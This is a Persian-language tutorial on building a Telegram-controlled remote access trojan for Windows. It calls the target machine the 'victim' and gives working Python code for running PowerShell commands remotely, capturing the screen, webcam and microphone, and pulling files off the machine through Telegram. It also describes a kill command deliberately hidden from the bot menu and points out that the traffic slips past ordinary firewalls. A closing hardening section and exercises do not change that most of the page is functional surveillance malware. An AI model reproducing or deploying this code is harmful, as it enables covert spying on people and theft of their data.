ساخت RAT تلگرامی با پایتون

در این دوره یک ابزار مدیریت از راه دور (RAT) می‌سازیم که سرور آن خودِ تلگرام است: بدون IP عمومی، بدون پورت باز، بدون دامنه. کنترل کامل ویندوز از داخل چت.

در پایان دوره چه چیزی بلد می‌شوید؟

  • معماری بات‌های async با python-telegram-bot نسخه ۲۰+
  • اجرای دستور سیستمی، گرفتن اسکرین‌شات، ضبط صفحه، وبکم و میکروفن
  • انتقال فایل دوطرفه با تکه‌تکه‌سازی فایل‌های بزرگ
  • مدیریت state، thread، و جدا کردن کارهای بلاک‌کننده از event loop
  • پیدا کردن و رفع باگ‌های واقعی در کد async + PowerShell

نکته: کد پایه توسط شما نوشته شده؛ در این دوره همان کد را خط‌به‌خط می‌خوانیم، باگ‌هایش را می‌گیریم و نسخه‌ی درست را می‌سازیم.

معماری: چرا تلگرام به‌عنوان سرور؟

در RAT کلاسیک باید پورت باز کنی، IP ثابت بگیری و NAT را رد کنی. اینجا کلاینت (قربانی) به‌صورت outbound به API تلگرام وصل می‌شود و تو از هر جای دنیا فقط در چت دستور می‌دهی.

# جریان داده
   [ گوشی/لپ‌تاپ شما ]  ──►  api.telegram.org  ◄──  [ ویندوز قربانی ]
          دستور /screenshot                    خروجی: عکس PNG
          فایل آپلود ──────────────────────►  ذخیره در received_files
          دانلود ◄──────────────────────────  /download C:\secret.docx

پیامدهای امنیتی که باید بدانی

  • ترافیک از CDN تلگرام رد می‌شود؛ فایروال معمولی چیزی نمی‌بیند.
  • توکن بات = کلید کل سیستم. لو رفتنش یعنی کنترل کامل.
  • بدون allow-list، هر کسی که آیدی بات را پیدا کند می‌تواند دستور بدهد.

هسته‌ی ابزار: run_system_command

def run_system_command(command: str, cwd: str) -> str:
    try:
        if platform.system() == "Windows":
            result = subprocess.run(
                ["powershell", "-NoProfile", "-Command", command],
                capture_output=True, text=True, timeout=90,
                encoding="utf-8", errors="replace", cwd=cwd,
            )
        else:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True,
                timeout=90, encoding="utf-8", errors="replace", cwd=cwd,
            )
        output = (result.stdout or "") + (result.stderr or "")
        return output.strip() or "[No output]"
    except subprocess.TimeoutExpired:
        return "[Error] Command timed out."
    except Exception as e:
        return f"[Error] {type(e).__name__}: {e}"

چهار تصمیم طراحی که باید توضیح داده شوند

  • لیست آرگومان + -Command در ویندوز: از تزریق shell تا حد زیادی جلوگیری می‌کند و cmdletها کار می‌کنند.
  • timeout=90: دستور بی‌پایان کل بات را قفل نمی‌کند.
  • errors="replace": خروجی با کدپیج عجیب، هندلر را کرش نمی‌کند.
  • ادغام stderr: خطاها هم به ادمین برمی‌گردند، نه فقط stdout.

در POSIX از shell=True استفاده شده چون رشته‌ی کامل دستور می‌آید؛ در ویندوز PowerShell جای shell را گرفته است.

فایل بزرگ: زیپ و تکه‌تکه

def create_zip_and_split(source: Path) -> list[Path]:
    zip_path = TEMP_FOLDER / f"{source.name}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(source, arcname=source.name)

    parts = []
    with open(zip_path, "rb") as f:
        part_num = 1
        while True:
            chunk = f.read(MAX_FILE_SIZE)
            if not chunk:
                break
            part_path = TEMP_FOLDER / f"{source.name}.zip.part{part_num:03d}"
            with open(part_path, "wb") as pf:
                pf.write(chunk)
            parts.append(part_path)
            part_num += 1

    zip_path.unlink(missing_ok=True)
    return parts

خواندن تکه‌تکه با f.read(MAX_FILE_SIZE) کل فایل را در RAM نمی‌ریزد. نام‌گذاری :03d مرتب‌سازی الفبایی درست را تضمین می‌کند — بدون آن part10 قبل از part2 می‌آید.

copy /b file.zip.part001 + file.zip.part002 out.zip

ارسال متن طولانی بدون شکستن HTML

def esc(value) -> str:
    return html.escape(str(value))


def split_text(text: str, size: int = MAX_MESSAGE_LENGTH) -> list[str]:
    return [text[i:i + size] for i in range(0, len(text), size)]


async def reply_pre(message, text: str) -> None:
    for chunk in split_text(text):
        await message.reply_text(f"<pre>{esc(chunk)}</pre>", parse_mode="HTML")

✅ باگ واقعی که گرفته شد

نسخه‌ی قبلی اول کل خروجی را escape می‌کرد و بعد با safe[i:i+4000] می‌برید. اگر برش وسط یک entity می‌افتاد، چیزی مثل &am در انتهای یک پیام و p; در پیام بعد می‌ماند و تلگرام خطای can't parse entities می‌داد.

چرا run_in_executor؟

subprocess.run بلاک‌کننده است. اگر مستقیم صدایش بزنی، تا ۹۰ ثانیه event loop می‌خوابد و بات به هیچ پیامی جواب نمی‌دهد. با run_in_executor دستور در thread pool اجرا می‌شود و loop آزاد می‌ماند. در کد جدید جایگزین مدرن‌ترش asyncio.to_thread است.

پیام status بازخورد فوری می‌دهد و بعد پاک می‌شود؛ try/except دور delete است چون پیام ممکن است قبلاً پاک شده باشد.

def _screen_record_worker(stop_event: threading.Event, output_file: str) -> None:
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    with mss() as sct:
        monitor = sct.monitors[1]
        width = monitor["width"] - (monitor["width"] % 2)
        height = monitor["height"] - (monitor["height"] % 2)
        out = cv2.VideoWriter(output_file, fourcc, SCREEN_FPS, (width, height))
        frame_interval = 1.0 / SCREEN_FPS
        try:
            while not stop_event.is_set():
                started = time.monotonic()
                img = sct.grab(monitor)
                frame = np.array(Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX"))
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)[:height, :width]
                out.write(frame)
                delay = frame_interval - (time.monotonic() - started)
                if delay > 0:
                    time.sleep(delay)
        finally:
            out.release()

✅ سه اصلاح

  • نسخه‌ی قبل با sleep(0.05) و fps=10 کار می‌کرد؛ یعنی ۲۰ فریم در ثانیه تولید و با نرخ ۱۰ پخش می‌شد → ویدئوی دو برابر سریع. الان فاصله بر اساس monotonic محاسبه می‌شود.

  • کدک mp4v ابعاد فرد را دوست ندارد؛ ابعاد به زوج گرد می‌شوند.

def _record_webcam_video(output_file: str, seconds: float = 8.0) -> None:
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        raise RuntimeError("Cannot open webcam.")
    try:
        ok, frame = cap.read()
        if not ok:
            raise RuntimeError("Failed to capture image.")
        height, width = frame.shape[:2]          # ابعاد واقعی دوربین
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(output_file, fourcc, 15.0, (width, height))
        try:
            out.write(frame)
            start = time.monotonic()
            while time.monotonic() - start < seconds:
                ok, frame = cap.read()
                if not ok:
                    break
                out.write(frame)
        finally:
            out.release()
    finally:
        cap.release()

def _mic_record_worker(stop_event: threading.Event, frames_list: list) -> None:
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=MIC_RATE,
                    input=True, frames_per_buffer=MIC_CHUNK)
    try:
        while not stop_event.is_set():
            frames_list.append(stream.read(MIC_CHUNK, exception_on_overflow=False))
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()

سه نکته که باید در کلاس گفته شود

چرا os._exit و نه sys.exit؟

sys.exit فقط SystemExit می‌اندازد و باید به بالای پشته برسد؛ داخل event loop و با threadهای daemon، گاهی پروسه زنده می‌ماند. os._exit(0) بلافاصله پروسه را می‌کشد، بدون پاکسازی — که برای kill switch دقیقاً همان چیزی است که می‌خواهیم.

sleep(1) فرصت می‌دهد پیام از صف شبکه خارج شود؛ بدون آن، پیام ممکن است هرگز نرسد. این دستور در منوی بات ثبت نشده تا پنهان بماند.

ثبت منوی دستورها در post_init

async def post_init(app: Application):
    commands = [
        BotCommand("start", "Start the bot"),
        BotCommand("cmd", "Run system command"),
        BotCommand("screenshot", "Take screenshot"),
        ...
        BotCommand("setproxy", "Set proxy"),
        BotCommand("msg", "Show message box"),
    ]
    await app.bot.set_my_commands(commands)

post_init بعد از آماده شدن بات و قبل از شروع polling اجرا می‌شود — بهترین نقطه برای ثبت متادیتا.

✅ اصلاح

setproxy و msg در منو نبودند و کاربر عادی پیدایشان نمی‌کرد. killall عمداً بیرون ماند تا به‌عنوان دستور پنهان بماند.

متن توضیح هر دستور حداکثر ۲۵۶ کاراکتر است و باید کوتاه و انگلیسی بماند تا در کلاینت‌های مختلف درست نمایش داده شود.

main(): ساخت اپلیکیشن و پروکسی

def main():
    print("=" * 55)
    print(" Telegram Remote Administration Bot (Teaching Edition)")

سه نکته

  • تایم‌اوت‌ها صریح تنظیم شده‌اند؛ مقدار پیش‌فرض httpx برای شبکه‌ی ایران کوتاه است و مدام ReadTimeout می‌دهد.
  • request فقط وقتی ساخته می‌شود که پروکسی تعریف شده باشد؛ در غیر این صورت از تنظیمات پیش‌فرض استفاده می‌شود.
  • هشدار حالت آزاد را قبل از build چاپ می‌کنیم تا ادمین بداند allow-list خالی است.

  • هندلرهای دستور قبل از هندلر رسانه ثبت می‌شوند. اگر برعکس بود، یک فایل به‌نام /cmd.txt می‌توانست به‌عنوان رسانه گرفته شود.

هندلر رسانه هیچ فیلتر متنی ندارد؛ پس هر فایل یا عکس در چت، خودکار در received_files ذخیره می‌شود — که رفتار مطلوب همین ابزار است.

نکته‌ی عملی

در حالت exe، مسیر .env و پوشه‌های نسبی به محل اجرا وابسته می‌شوند. بهتر است کانفیگ را کنار exe نگه داری یا با sys.executable مسیر مبنا را بسازی.

سخت‌سازی: این ابزار RAT است

  • allow-list اجباری: در تولید، ALLOWED_USER_IDS را پر کن؛ حالت آزاد فقط برای تست است.
  • رمز روی دستورهای حساس: برای /cmd یک پارامتر تأیید اضافه کن.
  • محدود کردن ریشه: با is_relative_to() جلوی خروج از پوشه‌ی مجاز را بگیر.
  • لاگ محلی: هر دستور و خروجی را در یک فایل با تاریخ بنویس؛ بعد از قطع شدن بات، مدرکی می‌ماند.
  • پاک‌سازی مسیر: Path(original_name).name برای فایل‌های دریافتی.
  • محدودیت اندازه: سقف حجم برای فایل‌های ورودی و تعداد تکه‌های خروجی.
  • چرخش توکن: اگر توکن لو رفت، از BotFather لغو کن.

سه شکاف واقعی در همین کد

۱) path traversal در نام فایل ورودی. ۲) بدون محدودیت ریشه برای /cmd. ۳) بدون هیچ لاگی — تشخیص نفوذ ممکن نیست.

تمرین‌های کلاس

  1. دکوراتور @authorized بساز و ۱۷ تکرار دو خطی را حذف کن.
  2. /msg را طوری اصلاح کن که خط جدید هم پشتیبانی شود.
  3. در /download یک try/finally بگذار تا تکه‌های نیمه‌کاره پاک شوند.
  4. برای /webcam انتخاب ایندکس دوربین اضافه کن (/webcam 1).
  5. handle_media را در برابر ..\..\evil.exe ایمن کن.
  6. یک /tail <path> بنویس که ۲۰ خط آخر یک فایل لاگ را بفرستد.
  7. ضبط میکروفن را روی دیسک بنویس تا حافظه پر نشود.
  8. یک تست واحد برای split_text و reply_pre با متن حاوی entity بنویس.

معیار پذیرش

هیچ تمرینی نباید event loop را بلاک کند، هیچ ورودی کاربر بدون escape به HTML نرود، و هر منبع باز (فایل، استریم، thread) در finally آزاد شود.

جمع‌بندی

از یک اسکریپت ساده به یک ابزار کامل رسیدیم و در همین مسیر ۱۲ باگ واقعی را دیدیم؛ تقریباً همه‌شان در سه خانواده بودند:

  • escape و رمزگذاری رشته — HTML و PowerShell هر دو زبان خودشان را دارند.
  • همزمانی — کار بلاک‌کننده در thread، و ماشین حالت برای منابع مشترک.
  • اعتبارسنجی ورودی — مسیر، نام فایل، لیست سفید.
